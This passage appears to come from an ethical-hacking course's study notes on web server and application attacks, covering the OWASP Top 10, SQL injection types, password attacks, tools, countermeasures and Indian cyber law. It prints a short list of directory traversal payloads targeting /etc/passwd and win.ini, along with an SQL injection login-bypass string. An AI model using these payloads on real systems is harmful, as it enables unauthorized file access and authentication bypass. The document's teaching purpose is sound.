    │   ├── Cache poisoning ───── Unkeyed headers → malicious cached response
    │   └── Web shell ─────────── Upload malicious script → RCE
    │
    ├── WEB APPLICATION VULNERABILITIES (OWASP Top 10)
    │   ├── A01 Broken Access Control
    │   │   ├── IDOR ──────────── Change object ID → access other users' data
    │   │   └── Path traversal ── ../ in file path → access any OS file
    │   ├── A03 Injection
    │   │   ├── SQL Injection ─── User input in SQL query → DB manipulation
    │   │   ├── Command injection  User input in OS command → RCE
    │   │   └── XXE ────────────── XML external entity → file disclosure/SSRF
    │   ├── A05 Security Misconfiguration
    │   │   └── Default settings | verbose errors | open directories
    │   ├── A07 Auth Failures
    │   │   └── Weak passwords | no lockout | plain text storage
    │   └── XSS ─────────────────── JS injection in browser
    │       ├── Reflected ── URL parameter → single victim
    │       ├── Stored ───── DB → all visitors
    │       └── DOM ──────── Client-side JS manipulation
    │
    ├── WEB PASSWORD CRACKING
    │   ├── Brute force ──────── All combinations against one account
    │   ├── Dictionary ──────── Wordlist against target (rockyou.txt)
    │   ├── Credential stuffing  Breach pairs → many services
    │   ├── Password spraying ── One common password → many accounts
    │   └── Tools: Hydra | Burp Intruder | Medusa | Wfuzz
    │
    └── COUNTERMEASURES
        ├── SQL injection ── Parameterized queries (prepared statements)
        ├── XSS ─────────── HttpOnly + CSP + output encoding
        ├── IDOR ─────────── Server-side authorization on every request
        ├── Traversal ────── Canonicalize + whitelist paths
        ├── Password ─────── MFA + lockout + rate limiting + CAPTCHA
        └── General ──────── WAF + patch + least privilege + logging

---

## ⚡ Quick Reference Cheatsheet

### 🌐 Web Vulnerability Quick Reference

| Vulnerability | OWASP 2021 | Root Cause | Primary Fix |
|---|---|---|---|
| SQL Injection | A03 | String concatenation in SQL | Parameterized queries |
| XSS | A03 | Unsanitized output to browser | Output encoding + CSP |
| IDOR | A01 | Missing object-level authorization | Server-side auth check per request |
| Path Traversal | A01 | No path canonicalization | Canonicalize + restrict to web root |
| Command Injection | A03 | User input in shell command | Never pass input to shell |
| XXE | A03 | External entities enabled | Disable external entities in parser |
| Broken Auth | A07 | Weak implementation | MFA + strong passwords + lockout |
| File Upload | A03/A05 | No file type/execution restriction | Store outside web root + magic bytes |
| Parameter Tampering | A01 | Trusting client values | Recalculate server-side |
| Security Misconfiguration | A05 | Default settings not hardened | Harden defaults + remove defaults |

---

### 💉 SQL Injection Types

| Type | Output Method | Speed | Use Case |
|---|---|---|---|
| Classic (In-band) | HTTP response | Fast | Visible output available |
| Error-based | DB error messages | Fast | Error messages not suppressed |
| Union-based | Additional rows in response | Fast | Response renders data |
| Boolean Blind | Different responses true/false | Slow | No output — binary inference |
| Time-based Blind | Response delay | Very slow | No output difference at all |
| Out-of-band | DNS/HTTP from DB server | Variable | All output blocked |

---

### 🔑 Web Password Attack Comparison

| Attack | Input | Target | Lockout Risk | Effectiveness |
|---|---|---|---|---|
| Brute Force | All combinations | One account | ✅ High | Low (slow) |
| Dictionary | Wordlist | One account | ✅ High | Medium |
| Credential Stuffing | Breach pairs | Many accounts | ⚠️ Medium | High (real passwords) |
| Password Spraying | One common password | Many accounts | ❌ None | High in corporate env |

---

### 🛡️ Directory Traversal Payloads

    Basic Unix:           ../../../../etc/passwd
    Basic Windows:        ..\..\..\..\windows\win.ini
    URL encoded:          %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
    Double URL encoded:   %252e%252e%252f
    Null byte (old PHP):  ../../../../etc/passwd%00.jpg
    Unicode slash:        ..%c0%af..%c0%afetc%c0%afpasswd

---

### 🔧 Key Web Hacking Tools

| Tool | Primary Use | Target |
|---|---|---|
| Burp Suite | Web app testing proxy | HTTP/HTTPS — all web vulns |
| sqlmap | SQL injection automation | Database-backed web apps |
| Nikto | Web server scanning | Apache, Nginx, IIS |
| Hydra | Online brute force | Web forms, basic auth |
| Wfuzz | Web fuzzer | Parameters, directories |
| OWASP ZAP | Web app scanner | OWASP Top 10 |
| Dirbuster/Gobuster | Directory enumeration | Hidden paths on web server |
| CeWL | Custom wordlist generation | Target-specific password lists |
| Whatweb | Web fingerprinting | Technology stack identification |

---

### 📋 OWASP Top 10 Quick Reference

| 2021 | 2017 | Category |
|---|---|---|
| A01 | A5 | Broken Access Control |
| A02 | A3 | Cryptographic Failures |
| A03 | A1 | Injection (SQLi, XSS, XXE, CMDi) |
| A04 | NEW | Insecure Design |
| A05 | A6 | Security Misconfiguration |
| A06 | A9 | Vulnerable and Outdated Components |
| A07 | A2 | Identification and Authentication Failures |
| A08 | A8 | Software and Data Integrity Failures |
| A09 | A10 | Security Logging and Monitoring Failures |
| A10 | NEW | Server-Side Request Forgery (SSRF) |

---

### ⚖️ Indian Legal Reference

| Law | Section | Offence | Penalty |
|---|---|---|---|
| IT Act 2000 | S.43(a) | Unauthorized web server access | Civil ₹1 crore |
| IT Act 2000 | S.66 | Criminal web hacking | 3 yrs + ₹5L |
| IT Act 2000 | S.66B | Receiving stolen DB data | 3 yrs + ₹1L |
| IT Act 2000 | S.66C | Identity theft via credential theft | 3 yrs + ₹1L |
| IT Act 2000 | S.66F | Attack on critical web infrastructure | Life imprisonment |
| IPC | S.420 | Financial fraud via web exploitation | 7 yrs + fine |
| DPDPA 2023 | — | Personal data breach via web attack | ₹250 crore |

---

## ✅ Session Revision Snapshot

### ⚡ TL;DR — 5 Bullets

1. **Web server attacks target the infrastructure layer — directory
   traversal escapes the web root using `../` sequences to read OS
   files; misconfiguration attacks exploit default settings, directory
   listing, and version disclosure to identify and target specific CVEs;
   web shells are uploaded via file upload vulnerabilities to achieve RCE.**

2. **SQL injection is the consequence of concatenating user input into
   SQL queries — the ONLY complete fix is parameterized queries (prepared
   statements). Types: Classic (direct output), Union-based (append SELECT),
   Error-based (trigger DB errors), Boolean/Time-based Blind (no output —
   infer from response). OWASP A03 (2021) — was A1 (2017).**

3. **OWASP Top 10 2021 A01 is Broken Access Control (IDOR, path traversal)
   — not injection. A03 is Injection (SQL, XSS, Command, XXE). The 2021
   list moved Broken Access Control to #1 — the most commonly found
   vulnerability in real-world applications. Know both 2017 and 2021.**

4. **Web password cracking has four main types: brute force (all combos,
   one account, triggers lockout), dictionary (wordlist, one account),
   credential stuffing (real breach pairs, many services, effective),
   password spraying (one common password, many accounts, never triggers
   lockout). MFA is the primary countermeasure for all four.**

5. **XSS attacks the victim's browser — not the server. Stored XSS (A03)
   persists in the database and executes for every visitor. HttpOnly
   cookie attribute prevents XSS-based cookie theft. Content Security
   Policy (CSP) prevents execution of injected scripts. IDOR (A01)
   requires server-side authorization check on EVERY object access —
   not just path-level access control.**

---

### 🎯 MCQ-Likely Concepts

- [ ] Directory traversal — `../` sequences — OS file access
- [ ] Directory traversal vs directory listing — different attacks
- [ ] Web server version disclosure countermeasure — `ServerTokens Prod`
- [ ] `no ip directed-broadcast` equivalent for web: `Options -Indexes`
- [ ] SQL injection — authentication bypass payload — `' OR '1'='1`
- [ ] SQL injection types — classic, union, error, boolean blind, time-based
- [ ] Parameterized queries — only complete SQLi fix
- [ ] OWASP 2021 A01 — Broken Access Control (IDOR)
- [ ] OWASP 2021 A03 — Injection (SQLi, XSS, XXE, command injection)
- [ ] OWASP 2017 A1 — Injection (SQLi)
- [ ] OWASP 2017 A7 — XSS
- [ ] IDOR — horizontal access control violation — change object ID
- [ ] IDOR fix — server-side authorization on every object access
- [ ] XSS — executes in victim's browser — server is delivery mechanism
- [ ] Stored XSS vs reflected XSS — persistence and scale
- [ ] HttpOnly — blocks XSS cookie theft
- [ ] CSP — Content Security Policy — blocks XSS script execution
- [ ] XXE — XML external entity — local file disclosure
- [ ] Command injection operators — `;`, `&&`, `|`, `||`
- [ ] File upload — store outside web root — check magic bytes
- [ ] Parameter tampering — never trust client-side values
- [ ] HTTP Basic Auth — Base64 NOT encryption — only safe over HTTPS
- [ ] HTTP TRACE method — enables XST — should be disabled
- [ ] Brute force vs password spraying — lockout difference
- [ ] Credential stuffing — real breach passwords — more effective than brute force
- [ ] Hydra — online brute force tool — HTTP POST form syntax
- [ ] Burp Suite Intruder — web form brute force
- [ ] sqlmap — automated SQL injection tool
- [ ] Nikto — web server vulnerability scanner
- [ ] WAF bypass techniques — encoding, case variation, comments
- [ ] IT Act S.66F — web attack on critical infrastructure = life imprisonment
- [ ] DPDPA 2023 — web breach involving personal data — ₹250 crore

---

### 💼 Interview-Likely

- Explain SQL injection — how does it work and what is the only complete fix?
- What is the difference between IDOR and privilege escalation?
- What is directory traversal and what three names is it known by?
- Explain the difference between stored and reflected XSS.
- Why is HTTP Basic Authentication insecure over plain HTTP?
- What is password spraying and how does it evade account lockout?
- What is credential stuffing and why is it more effective than brute force?
- What is the difference between OWASP Top 10 2017 and 2021 — specifically what moved to A01?
- How does a WAF help and what are its limitations against SQL injection?
- What is XXE and what impact can it have on an application?

---

## Next Session Bridge

Session 17A covered web server and application layer attacks —
the most common attack surface for modern internet-facing systems.
The key insight: web applications create trust between user
and server — every vulnerability exploits a specific misuse
of that trust relationship.

Session 17B moves to **wireless hacking** — extending the attack
surface from wired web applications to the physical radio layer.
Where web applications have HTTP as their protocol, wireless
networks have 802.11 as their protocol — with its own authentication
mechanisms (WEP, WPA, WPA2, WPA3), its own vulnerabilities, and
its own set of attack tools. The sniffing knowledge from Session 15
(passive capture) and the password cracking knowledge from this
session (wordlists, brute force) both directly apply to wireless
network password cracking.

---

<details>
<summary>📖 Glossary</summary>

| Term | Definition |
|---|---|
| **Apache HTTP Server** | Open-source web server — most widely deployed historically — Linux-based |
| **Blind SQL Injection** | SQLi where results are not displayed — attacker infers data from true/false responses or timing |
| **Brute Force** | Systematically trying all possible password combinations |
| **Burp Suite** | Industry-standard web application security testing proxy and toolkit |
| **CAPTCHA** | Challenge-response test distinguishing humans from automated bots |
| **CeWL** | Custom Word List generator — crawls target website to build targeted wordlist |
| **Command Injection** | Attack injecting OS commands through application input that passes to shell execution |
| **Content Security Policy** | HTTP header restricting which scripts and resources browser will execute |
| **Credential Stuffing** | Using real stolen credentials from previous breaches against new target services |
| **CRLF Injection** | Injecting carriage return and line feed characters into HTTP headers — enables response splitting |
| **Cross-Site Tracing** | Using HTTP TRACE method with XSS to steal HttpOnly cookies |
| **CVE** | Common Vulnerabilities and Exposures — standardized identifier for known security vulnerabilities |
| **CVSS** | Common Vulnerability Scoring System — 0–10 severity score for CVEs |
| **Directory Listing** | Web server feature showing directory contents when no index file exists |
| **Directory Traversal** | Using `../` sequences to escape web root and access arbitrary OS files |
| **DVWA** | Damn Vulnerable Web Application — intentionally vulnerable training platform |
| **Error-based SQLi** | SQL injection that extracts data through database error messages |
| **File Upload Vulnerability** | Insufficient file validation allowing malicious script upload and execution |
| **Hydra** | THC-Hydra — network login brute force tool supporting 50+ protocols |
| **IDOR** | Insecure Direct Object Reference — accessing other users' objects by changing identifier |
| **Nikto** | Open-source web server scanner checking for vulnerabilities, outdated software, and misconfigurations |
| **Null Byte** | `%00` character — used to truncate strings in older vulnerable implementations |
| **OWASP** | Open Web Application Security Project — non-profit producing Top 10 and other security resources |
| **Parameterized Query** | SQL query using placeholders for user data — prevents SQL injection |
| **Parameter Tampering** | Modifying HTTP request parameters to alter application behaviour |
| **Password Spraying** | Testing one common password against many accounts to avoid per-account lockout |
| **Path Traversal** | Alternative name for directory traversal attack |
| **Prepared Statement** | Pre-compiled SQL with separate data parameters — prevents SQL injection |
| **RCE** | Remote Code Execution — ability to run arbitrary commands on target server |
| **Reflected XSS** | Non-persistent XSS in URL parameter — victim must click crafted link |
| **RockYou.txt** | 14.3 million real password wordlist from 2009 breach — standard pentesting resource |
| **Security Misconfiguration** | OWASP A05 — insecure default settings, open directories, verbose errors |
| **sqlmap** | Automated SQL injection detection and exploitation tool |
| **SSRF** | Server-Side Request Forgery — server makes HTTP request to attacker-specified URL |
| **Stored XSS** | Persistent XSS stored in database — executes for every page visitor |
| **Time-based Blind SQLi** | Blind SQL injection using database sleep functions to infer data from response delays |
| **Union-based SQLi** | SQL injection appending UNION SELECT to extract data from additional tables |
| **WAF** | Web Application Firewall — filters HTTP traffic for known attack patterns |
| **Web Cache Poisoning** | Injecting malicious response into cache — served to all subsequent users |
| **Web Shell** | Malicious script uploaded to web server providing remote command execution |
| **Wfuzz** | Web application fuzzer for testing parameters, authentication, directories |
| **Whatweb** | Web technology fingerprinting tool identifying CMS, framework, server software |
| **XSS** | Cross-Site Scripting — injecting malicious JavaScript into pages viewed by victims |
| **XXE** | XML External Entity — XML parser flaw enabling local file disclosure or SSRF |

</details>

---
